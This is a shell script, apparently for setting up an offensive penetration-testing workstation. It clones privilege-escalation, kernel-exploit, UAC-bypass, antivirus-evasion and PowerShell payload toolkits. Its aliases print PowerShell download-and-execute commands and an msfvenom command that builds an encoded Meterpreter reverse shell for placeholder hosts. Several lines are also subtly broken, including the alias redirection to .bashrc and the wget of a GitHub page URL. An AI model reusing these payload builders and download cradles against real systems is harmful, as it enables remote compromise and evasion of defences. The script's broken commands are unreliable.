#!/usr/bin/sh

#Check the reqiuired tools are installed
apt-get install git -y


#Addings helpful alias's for red teamining
alias serve='python -m SimpleHTTPServer 80' >> ~/.bashrc
alias psget='echo "IEX(New-Object Net.WebClient).DownloadFile('__SRC__','__DST__')"' >> ~/.bashrc
alias psrun='echo "IEX(New-Object Net.WebClient).DownloadString('__SRC__')"' >> ~/.bashrc
alias psshell='echo "msfvenom -p windows/meterpreter/reverse_tcp LHOST=__IP__ LPORT=__LPORT__ -f psh --smallest | msfvenom -p - --platform win --arch x32 --encoder powershell/base64 NOEXIT SYSWOW64 -o payload.ps1"' >> ~/.bashrc

#Settings up PT Dir
mkdir /opt/PT/
cd /opt/PT/

#Priv esc dir
mkdir PrivEsc
cd PrivEsc
git clone https://github.com/AusJock/Privilege-Escalation


#Windows priv esc tools
mkdir WindowsPrivEsc
cd WindowsPrivEsc
git clone https://github.com/411Hall/JAWS
git clone https://github.com/SecWiki/windows-kernel-exploits
git clone https://github.com/rasta-mouse/Watson
git clone https://github.com/rasta-mouse/Sherlock
git clone https://github.com/GDSSecurity/Windows-Exploit-Suggester
git clone https://github.com/pentestmonkey/windows-privesc-check
git clone https://github.com/hfiref0x/UACME
wget https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1
cd ../../

#Payload gen tools
mkdir payloadGen
cd payloadGen
git clone https://github.com/trustedsec/unicorn
git clone https://github.com/oddcod3/Phantom-Evasion
git clone https://github.com/Veil-Framework/Veil-Evasion
cd ..

#Helpful powershell payloads
mkdir powershellPayloads
cd powershellPayloads
git clone https://github.com/samratashok/nishang
cd ..
